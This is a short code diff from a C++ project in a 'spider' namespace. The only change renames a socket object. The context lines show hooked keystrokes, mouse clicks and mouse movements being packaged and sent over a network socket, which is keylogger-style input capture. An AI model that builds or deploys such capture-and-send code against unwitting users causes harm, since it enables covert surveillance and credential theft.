@@ -133,7 +133,7 @@ namespace spider
 				}
 				strncpy(keyStruct->id, buffer, 30);
 				std::cout << hookedKey.time << " key = " << keyStruct->id  << std::endl;
-				tutu.write<PackageCMDKeyboardTouch>(spider::PacketSerializer<PackageCMDKeyboardTouch>(
+				sock.write<PackageCMDKeyboardTouch>(spider::PacketSerializer<PackageCMDKeyboardTouch>(
 					sizeof(PackageHeader) + sizeof(PackageCMDKeyboardTouch), 666, *keyStruct));
 			}
 		}
@@ -166,7 +166,7 @@ namespace spider
 			mouseClic->x = p.x;
 			mouseClic->y = p.y;
 			// TODO: Send to input queue
-			tutu.write<PackageCMDMouseClic>(spider::PacketSerializer<PackageCMDMouseClic>(
+			sock.write<PackageCMDMouseClic>(spider::PacketSerializer<PackageCMDMouseClic>(
 				sizeof(PackageHeader) + sizeof(PackageCMDMouseClic), 666, *mouseClic));
 			//std::cout << " Right click ";
 		}
@@ -177,7 +177,7 @@ namespace spider
 			mouseMove->x = p.x;
 			mouseMove->y = p.y;
 			// TODO: Send to input queue
-			tutu.write<PackageCMDMouseMove>(spider::PacketSerializer<PackageCMDMouseMove>(
+			sock.write<PackageCMDMouseMove>(spider::PacketSerializer<PackageCMDMouseMove>(
 				sizeof(PackageHeader) + sizeof(PackageCMDMouseMove), 666, *mouseMove));
 			//std::cout << " Movement ";
 		}
